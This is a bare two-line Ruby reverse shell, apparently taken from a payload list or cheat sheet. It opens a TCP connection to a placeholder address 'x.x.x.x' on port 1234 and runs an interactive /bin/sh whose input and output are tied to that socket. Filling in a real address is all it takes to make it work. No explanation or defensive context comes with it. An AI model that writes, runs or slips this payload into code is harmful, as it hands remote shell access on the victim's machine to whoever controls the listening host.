f=TCPSocket.open("x.x.x.x",1234).to_i; 
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
